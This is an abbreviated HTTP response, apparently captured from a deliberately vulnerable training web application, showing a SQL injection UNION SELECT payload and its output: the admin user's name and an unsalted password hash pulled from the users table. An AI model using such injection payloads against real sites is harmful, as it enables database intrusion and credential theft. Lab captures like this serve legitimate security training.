HTTP/1.1 200 OK
Date: Sun, 21 Jun 2026 00:31:13 GMT
...
<div class="body_padded">
	...
	<div class="vulnerable_code_area">
		...
		<pre>ID: -1' UNION SELECT user,password FROM users WHERE user='admin'-- <br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
	</div>
